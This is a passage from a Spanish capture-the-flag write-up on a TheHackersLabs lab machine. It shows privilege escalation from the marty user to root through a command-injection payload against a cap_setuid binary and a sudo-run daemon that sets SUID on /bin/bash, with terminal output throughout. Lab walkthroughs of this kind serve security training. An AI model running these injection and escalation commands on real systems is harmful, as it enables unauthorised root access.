</span></span><span class=line><span class=cl>1g 0:00:01:35 DONE <span class=o>(</span>2025-07-20 16:50<span class=o>)</span> 0.01051g/s 50.82p/s 50.82c/s 50.82C/s 2222222..onelove1
</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span class=line><span class=cl>Session completed.</span></span></code></pre></div></figure></div><p>Bien!! Ahora vamos a inciar como <code>marty</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>pylon㉿kali<span class=o>)</span>-<span class=o>[</span>~/Desktop/pylon/THL/BackToTheFuture<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ ssh marty@192.168.44.133 -i id_rsa
</span></span><span class=line><span class=cl>Enter passphrase <span class=k>for</span> key <span class=s1>&#39;id_rsa&#39;</span>:
</span></span><span class=line><span class=cl>Last login: Sun Jul <span class=m>20</span> 07:39:55 <span class=m>2025</span> from 192.168.44.128
</span></span><span class=line><span class=cl>-bash-5.2$ whoami
</span></span><span class=line><span class=cl>marty
</span></span><span class=line><span class=cl>-bash-5.2$</span></span></code></pre></div></figure></div><h2 id=shell-as-docbrown>Shell as docbrown<a href=#shell-as-docbrown class=anchor aria-hidden=true>#</a></h2><p>Bien!! Si volvemos a hacer un <code>ls -la</code> en el directorio de <code>marty</code> veremos otra cosa rara:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>marty@hillvalley:~$ ls -la
</span></span><span class=line><span class=cl>total <span class=m>56</span>
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>7</span> marty    marty    <span class=m>4096</span> Jul <span class=m>20</span> 11:44 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>4</span> root     root     <span class=m>4096</span> Jul <span class=m>12</span> 15:49 ..
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> root     root        <span class=m>9</span> Jul <span class=m>13</span> 16:50 .bash_history -&gt; /dev/null
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> marty    marty     <span class=m>220</span> Mar <span class=m>29</span>  <span class=m>2024</span> .bash_logout
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> marty    marty    <span class=m>3552</span> Jul <span class=m>12</span> 20:45 .bashrc
</span></span><span class=line><span class=cl>drwx------ <span class=m>4</span> marty    marty    <span class=m>4096</span> Jul <span class=m>12</span> 20:28 .cache
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> marty    marty    <span class=m>4096</span> Jul <span class=m>12</span> 20:28 .config
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> marty    marty    <span class=m>5290</span> Jul <span class=m>12</span>  <span class=m>2023</span> .face
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> marty    marty       <span class=m>5</span> Jul <span class=m>12</span>  <span class=m>2023</span> .face.icon -&gt; .face
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> docbrown docbrown   <span class=m>80</span> Jul <span class=m>12</span> 21:19 .flux_notes
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> root     root     <span class=m>4096</span> Jul <span class=m>12</span> 19:48 ftp
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>4</span> marty    marty    <span class=m>4096</span> Jul <span class=m>12</span> 20:28 .local
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> marty    marty     <span class=m>807</span> Mar <span class=m>29</span>  <span class=m>2024</span> .profile
</span></span><span class=line><span class=cl>drwx------ <span class=m>2</span> marty    marty    <span class=m>4096</span> Jul <span class=m>14</span> 20:16 .ssh
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root     root       <span class=m>16</span> Jul <span class=m>14</span> 20:22 user.txt</span></span></code></pre></div></figure></div><p>Vemos el fichero <code>.flux_notes</code>, vamos a leerlo:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>marty@hillvalley:~$ cat .flux_notes
</span></span><span class=line><span class=cl>Tiempos inestables... aún necesito arreglar el runner para la próxima prueba.</span></span></code></pre></div></figure></div><p><code>runner</code>?.. No entiendo lo que queire decir, seguramente sea una pista. Vamos a intentar ver el <code>home</code> del usuario <code>docbrown</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>marty@hillvalley:~$ ls -la
</span></span><span class=line><span class=cl>total <span class=m>88</span>
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>15</span> docbrown docbrown <span class=m>4096</span> Jul <span class=m>15</span> 10:45 .
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>4</span> root     root     <span class=m>4096</span> Jul <span class=m>12</span> 15:49 ..
</span></span><span class=line><span class=cl>lrwxrwxrwx  <span class=m>1</span> root     root        <span class=m>9</span> Jul <span class=m>13</span> 16:50 .bash_history -&gt; /dev/null
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> docbrown docbrown  <span class=m>220</span> Jul <span class=m>11</span> 22:04 .bash_logout
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> docbrown docbrown <span class=m>3662</span> Jul <span class=m>12</span> 20:23 .bashrc
</span></span><span class=line><span class=cl>drwx------ <span class=m>10</span> docbrown docbrown <span class=m>4096</span> Jul <span class=m>11</span> 22:27 .cache
</span></span><span class=line><span class=cl>drwx------  <span class=m>9</span> docbrown docbrown <span class=m>4096</span> Jul <span class=m>12</span> 20:41 .config
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> docbrown docbrown <span class=m>4096</span> Jul <span class=m>11</span> 22:08 Desktop
</span></span><span class=line><span class=cl>drwxrwxrwx  <span class=m>2</span> docbrown docbrown <span class=m>4096</span> Jul <span class=m>12</span> 20:49 docs
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> docbrown docbrown <span class=m>4096</span> Jul <span class=m>11</span> 22:08 Documents
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> docbrown docbrown <span class=m>4096</span> Jul <span class=m>11</span> 22:08 Downloads
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> docbrown docbrown <span class=m>5290</span> Jul <span class=m>11</span> 22:04 .face
</span></span><span class=line><span class=cl>lrwxrwxrwx  <span class=m>1</span> docbrown docbrown    <span class=m>5</span> Jul <span class=m>11</span> 22:04 .face.icon -&gt; .face
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> docbrown docbrown  <span class=m>110</span> Jul <span class=m>13</span> 14:10 .flux_hint
</span></span><span class=line><span class=cl>drwx------  <span class=m>4</span> docbrown docbrown <span class=m>4096</span> Jul <span class=m>11</span> 22:08 .local
</span></span><span class=line><span class=cl>drwx------  <span class=m>4</span> docbrown docbrown <span class=m>4096</span> Jul <span class=m>11</span> 22:27 .mozilla
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> docbrown docbrown <span class=m>4096</span> Jul <span class=m>11</span> 22:08 Music
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> docbrown docbrown <span class=m>4096</span> Jul <span class=m>11</span> 22:08 Pictures
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> docbrown docbrown  <span class=m>807</span> Jul <span class=m>11</span> 22:04 .profile
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> docbrown docbrown <span class=m>4096</span> Jul <span class=m>11</span> 22:08 Public
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> docbrown docbrown <span class=m>4096</span> Jul <span class=m>11</span> 22:08 Templates
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> docbrown docbrown <span class=m>4096</span> Jul <span class=m>11</span> 22:08 Videos
</span></span><span class=line><span class=cl>-rw-------  <span class=m>1</span> docbrown docbrown  <span class=m>817</span> Jul <span class=m>13</span> 12:52 .viminfo</span></span></code></pre></div></figure></div><p>Vemos el fichero <code>.flux_hint</code>, vamos a leerlo:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>marty@hillvalley:~$ cat .flux_hint
</span></span><span class=line><span class=cl>He estado trabajando en una nueva forma de sincronizar los scripts del sistema. Cada minuto... como un reloj.</span></span></code></pre></div></figure></div><p>Vemos que comenta un supuesto script que se ejecuta cada minuto, vamos a usar <a href=https://github.com/DominicBreuker/pspy/releases>pspy</a>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>marty@hillvalley:~$ ./pspy64
</span></span><span class=line><span class=cl>pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>     ██▓███    ██████  ██▓███ ▓██   ██▓
</span></span><span class=line><span class=cl>    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
</span></span><span class=line><span class=cl>    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
</span></span><span class=line><span class=cl>    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
</span></span><span class=line><span class=cl>    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
</span></span><span class=line><span class=cl>    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
</span></span><span class=line><span class=cl>    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
</span></span><span class=line><span class=cl>    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
</span></span><span class=line><span class=cl>                   ░           ░ ░
</span></span><span class=line><span class=cl>                               ░ ░
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Config: Printing events <span class=o>(</span><span class=nv>colored</span><span class=o>=</span><span class=nb>true</span><span class=o>)</span>: <span class=nv>processes</span><span class=o>=</span><span class=nb>true</span> <span class=p>|</span> file-system-events<span class=o>=</span><span class=nb>false</span> <span class=o>||</span><span class=p>|</span> Scanning <span class=k>for</span> processes every 100ms and on inotify events <span class=o>||</span><span class=p>|</span> Watching directories: <span class=o>[</span>/usr /tmp /etc /home /var /opt<span class=o>]</span> <span class=o>(</span>recursive<span class=o>)</span> <span class=p>|</span> <span class=o>[]</span> <span class=o>(</span>non-recursive<span class=o>)</span>
</span></span><span class=line><span class=cl>Draining file system events due to startup...
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span><span class=line><span class=cl>2025/07/20 11:55:32 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>1001</span>  <span class=nv>PID</span><span class=o>=</span><span class=m>1713</span>   <span class=p>|</span> ./pspy64
</span></span><span class=line><span class=cl>2025/07/20 11:55:32 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>1001</span>  <span class=nv>PID</span><span class=o>=</span><span class=m>1686</span>   <span class=p>|</span> bash
</span></span><span class=line><span class=cl><span class=o>[</span>..<span class=o>]</span>
</span></span><span class=line><span class=cl>2025/07/20 11:56:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>     <span class=nv>PID</span><span class=o>=</span><span class=m>1722</span>   <span class=p>|</span> /bin/sh -c /usr/local/bin/flux_admin.sh
</span></span><span class=line><span class=cl>2025/07/20 11:56:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>     <span class=nv>PID</span><span class=o>=</span><span class=m>1723</span>   <span class=p>|</span> /bin/sh /usr/local/bin/flux_admin.sh</span></span></code></pre></div></figure></div><p>Vemos un script llamado <code>flux_admin.sh</code>, vamos a hacer un <code>ls -l</code> para ver que permisos tiene:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>marty@hillvalley:~$ ls -l /usr/local/bin/
</span></span><span class=line><span class=cl>total <span class=m>36</span>
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> root root <span class=m>16200</span> Jul <span class=m>12</span> 20:49 backup_runner
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> root root    <span class=m>20</span> Jul <span class=m>20</span> 07:52 flux_admin.sh
</span></span><span class=line><span class=cl>-rwx------ <span class=m>1</span> root root <span class=m>16296</span> Jul <span class=m>14</span> 20:44 time_daemon</span></span></code></pre></div></figure></div><p>Vemos varios scripts&mldr; ejecutandolos no consigo gran cosa. Vamos a usar <a href=https://github.com/peass-ng/PEASS-ng>linPEAS</a>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>marty@hillvalley:~$ ./linpeas.sh
</span></span><span class=line><span class=cl><span class=o>[</span>..<span class=o>]</span>
</span></span><span class=line><span class=cl>/usr/local/bin/backup_runner <span class=nv>cap_setuid</span><span class=o>=</span>ep
</span></span><span class=line><span class=cl>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin<span class=o>=</span>ep
</span></span><span class=line><span class=cl>/usr/bin/ping <span class=nv>cap_net_raw</span><span class=o>=</span>ep
</span></span><span class=line><span class=cl><span class=o>[</span>..<span class=o>]</span></span></span></code></pre></div></figure></div><p>Vemos que el binario <code>backup_runner</code> tiene <code>cap_setuid=ep</code>, vamos a intentar a busar de el. Vamos a ejecutarlo a ver que ocurre:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>marty@hillvalley:~$ /usr/local/bin/backup_runner
</span></span><span class=line><span class=cl>Usage: backup_runner &lt;filename&gt;</span></span></code></pre></div></figure></div><p>Vemos que solicita que añadamos otro campo, en este caso un archivo. Y si intento ejecutar un comando ahí?</p><nav><div class="nav nav-tabs" id=nav-tab role=tablist><button data-toggle-tab=payload class="nav-link active" id=tabs-create-new-site-0-tab data-bs-toggle=tab data-bs-target=#tabs-create-new-site-0 type=button role=tab aria-controls=tabs-create-new-site-0 aria-selected=true>
Payload</button></div></nav><div class=tab-content id=nav-tabContent><div data-pane=payload class="tab-pane fade show active" id=tabs-create-new-site-0 role=tabpanel aria-labelledby=tabs-create-new-site-0-tab tabindex=0><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=s2>&#34;; whoami;&#34;</span></span></span></code></pre></div></figure></div></div></div><p>Vamos a probarlo:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>marty@hillvalley:~$ /usr/local/bin/backup_runner <span class=s2>&#34;; whoami;&#34;</span>
</span></span><span class=line><span class=cl>tar: Cowardly refusing to create an empty archive
</span></span><span class=line><span class=cl>Try <span class=s1>&#39;tar --help&#39;</span> or <span class=s1>&#39;tar --usage&#39;</span> <span class=k>for</span> more information.
</span></span><span class=line><span class=cl>docbrown
</span></span><span class=line><span class=cl>sh: 1: -backup.tar.gz: not found</span></span></code></pre></div></figure></div><p>Vemos que ahí se ejecutó el <code>whoami</code> dando como resultado <code>docbrownp</code>, vamos a darnos una <code>bash</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>marty@hillvalley:~$ /usr/local/bin/backup_runner <span class=s2>&#34;; /bin/bash;&#34;</span>
</span></span><span class=line><span class=cl>tar: Cowardly refusing to create an empty archive
</span></span><span class=line><span class=cl>Try <span class=s1>&#39;tar --help&#39;</span> or <span class=s1>&#39;tar --usage&#39;</span> <span class=k>for</span> more information.
</span></span><span class=line><span class=cl>docbrown@hillvalley:~$ whoami
</span></span><span class=line><span class=cl>docbrown</span></span></code></pre></div></figure></div><h2 id=shell-as-root>Shell as root<a href=#shell-as-root class=anchor aria-hidden=true>#</a></h2><p>Vamos a ver si el usuario <code>docbrown</code> tiene algún permiso SUDOERS:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>docbrown@hillvalley:~$ sudo -l
</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> docbrown on hillvaley:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin, use_pty
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User docbrown may run the following commands on hillvaley:
</span></span><span class=line><span class=cl>    <span class=o>(</span>root<span class=o>)</span> NOPASSWD: /usr/local/bin/time_daemon</span></span></code></pre></div></figure></div><p>Vamos a ejecutarlo a ver que ocurre:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>docbrown@hillvalley:~$ sudo /usr/local/bin/time_daemon
</span></span><span class=line><span class=cl><span class=o>[</span>FLUX<span class=o>]</span> No existe el archivo /tmp/sync: No such file or directory</span></span></code></pre></div></figure></div><p>Vemos que intenta apuntar a un archivo llamado <code>sync</code> en el directorio <code>/tmp/</code> lo vamos a crear y dentro intentaremos dar permisos <code>suid</code> a <code>/bin/bash</code>:</p><nav><div class="nav nav-tabs" id=nav-tab role=tablist><button data-toggle-tab=/tmp/sync class="nav-link active" id=tabs-create-new-site-0-tab data-bs-toggle=tab data-bs-target=#tabs-create-new-site-0 type=button role=tab aria-controls=tabs-create-new-site-0 aria-selected=true>
/tmp/sync</button></div></nav><div class=tab-content id=nav-tabContent><div data-pane=/tmp/sync class="tab-pane fade show active" id=tabs-create-new-site-0 role=tabpanel aria-labelledby=tabs-create-new-site-0-tab tabindex=0><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;chmod u+s /bin/bash&#34;</span> &gt; /tmp/sync</span></span></code></pre></div></figure></div></div></div><p>Ahora vamos a ejecutar <code>time_daemon</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>docbrown@hillvalley:~$ sudo /usr/local/bin/time_daemon
</span></span><span class=line><span class=cl><span class=o>[</span>88MPH<span class=o>]</span> Sincronización completada. Listo para viajar.</span></span></code></pre></div></figure></div><p>Ahora esperaremos un rato ya que hay una tarea cron configurada que ejecuta el script indicado como <code>root</code>. Despues de esperar un rato si hacemos un <code>ls -la</code> a <code>/bin/bash</code> veremos lo siguiente:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>docbrown@hillvalley:~$ ls -la /bin/bash
</span></span><span class=line><span class=cl>-rwsr-xr-x <span class=m>1</span> root root <span class=m>1265648</span> Apr <span class=m>18</span> 19:47 /bin/bash</span></span></code></pre></div></figure></div><p>Ahora solo iniciaremos una <code>bash</code> como privilegiado <code>(-p)</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>docbrown@hillvalley:~$ bash -p
</span></span><span class=line><span class=cl>bash-5.2# whoami
</span></span><span class=line><span class=cl>root</span></span></code></pre></div></figure></div><p>root! ;)</p><hr><div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between"></div><div class="page-nav d-flex flex-column flex-sm-row"><div class="card text-end w-100"><div class="card-body d-flex justify-content-end"><div class="d-flex flex-column"><div class=text-body-secondary>Next</div><a href=/writeups/thehackerslabs/pinguping/ class="stretched-link text-reset text-decoration-none">PinguPing</a></div><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M13 18l6-6"/><path d="M13 6l6 6"/></svg></div></div></div></div></main></div></div></div><footer class="footer text-muted"><div class=container-md><div class=row><div class="col-lg-8 text-center text-lg-start"><ul class=list-inline><li class=list-inline-item><a class=text-muted href=/privacy/>Privacy Policy</a></li></ul></div><div class="col-lg-8 text-center text-lg-end"><ul class=list-inline><li class=list-inline-item>Brought to you by <a class=text-muted href=https://gethyas.com/>Hyas</a></li></ul></div></div></div></footer><script async src=/js/bootstrap.c673c84373e66019f7895efc74b3b3b940071832aaa8a85e73218087d535e71b.js integrity="sha256-xnPIQ3PmYBn3iV78dLOzuUAHGDKqqKhecyGAh9U15xs="></script><script async src=/js/app.47b84f3b640408af6efe7bf4add1a36f5b9c6227fbae7b8bcdf0c9ce42fefc54.js integrity="sha256-R7hPO2QECK9u/nv0rdGjb1ucYif7rnuLzfDJzkL+/FQ="></script><script async src=/js/flexsearch.b6f80717bc68cd38b6ded7a061f96a73896db6be17a6582f09a63a6040040919.js integrity="sha256-tvgHF7xozTi23tegYflqc4lttr4XplgvCaY6YEAECRk="></script><script async src=/js/search-modal.4e30271fef6fac86c3b4143167e9784bd3f7037ce1045d03a321e7e799e91476.js integrity="sha256-TjAnH+9vrIbDtBQxZ+l4S9P3A3zhBF0DoyHn55npFHY="></script></body></html>